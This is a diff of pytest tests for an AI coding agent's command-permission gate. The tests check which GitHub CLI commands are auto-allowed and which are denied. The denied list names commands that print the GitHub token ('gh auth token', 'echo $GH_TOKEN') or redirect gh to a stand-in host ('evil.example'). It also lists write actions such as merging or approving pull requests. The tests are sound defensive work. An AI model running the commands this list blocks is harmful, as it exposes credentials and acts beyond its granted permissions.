@@ -281,3 +281,75 @@ def test_a_repositorys_task_runs_no_code_on_the_host(tmp_path: Path) -> None:
     fixing = _task(tmp_path, "workspace_write", run_code="skills")
     assert auto_answer(fixing, _ask("execute", "ruff check --fix src")).allow  # type: ignore[union-attr]
     assert not auto_answer(fixing, _ask("execute", "uv run pytest -q")).allow  # type: ignore[union-attr]
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "gh pr view 1758 --comments",
+        "gh pr diff 1758 -R RLinf/RLinf",
+        "gh pr checks 1758",
+        "gh issue view 12 --comments",
+        "gh run view 99 --log-failed",
+        "gh api repos/RLinf/RLinf/pulls/1758/reviews --paginate",
+        "gh api /repos/RLinf/RLinf/pulls/1758/comments --jq '.[].body'",
+        "gh api -X GET search/issues",
+        "gh search prs --repo RLinf/RLinf loader",
+    ],
+)
+def test_gh_reads_with_the_services_login(tmp_path: Path, command: str) -> None:
+    answer = auto_answer(_task(tmp_path, run_code="skills"), _ask("execute", command))
+    assert answer is not None and answer.allow, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "gh auth token",
+        "gh auth status -t",
+        "gh config get oauth_token",
+        "gh pr comment 1758 -b hi",
+        "gh pr review 1758 --approve",
+        "gh pr merge 1758",
+        "gh pr checkout 1758",
+        "gh pr view 1758 --web",
+        "gh issue create -t x -b y",
+        "gh repo clone RLinf/RLinf",
+        "gh api -X POST repos/RLinf/RLinf/issues/1/comments",
+        "gh api --method PATCH repos/RLinf/RLinf/pulls/1",
+        "gh api repos/RLinf/RLinf/issues/1/comments -f body=hi",
+        "gh api graphql -F query=@q.graphql",
+        "gh api repos/x/y --input body.json",
+        "gh api --hostname evil.example repos/x/y",
+        "echo $GH_TOKEN",
+        "echo ${GH_TOKEN}",
+    ],
+)
+def test_gh_never_writes_or_shows_the_token(tmp_path: Path, command: str) -> None:
+    answer = auto_answer(_task(tmp_path, run_code="skills"), _ask("execute", command))
+    assert answer is not None and not answer.allow, command
+
+
+async def test_only_gated_runs_on_a_repository_hold_the_services_login(
+    tmp_path: Path,
+) -> None:
+    from auto_maintainer.agents.adapters.antigravity import AntigravityRuntime
+    from auto_maintainer.agents.adapters.claude_code import ClaudeCodeRuntime
+
+    async def token(repo: str) -> str | None:
+        return "gho_" + "x" * 30
+
+    gated = AntigravityRuntime(runs_dir=tmp_path / "runs")
+    gated.github_token = token
+    task = _task(tmp_path, run_code="skills").model_copy(update={"repo": "acme/widget"})
+    assert await gated.github_env(task) == {"GH_TOKEN": "gho_" + "x" * 30}
+    for other in (
+        task.model_copy(update={"permissions": "bypass"}),
+        task.model_copy(update={"run_code": "any"}),
+        task.model_copy(update={"run_code": "none"}),
+        task.model_copy(update={"repo": None}),
+    ):
+        assert await gated.github_env(other) == {}
+    ungated = ClaudeCodeRuntime(runs_dir=tmp_path / "runs")
+    ungated.github_token = token
+    assert await ungated.github_env(task) == {}, "its own auto mode decides commands"
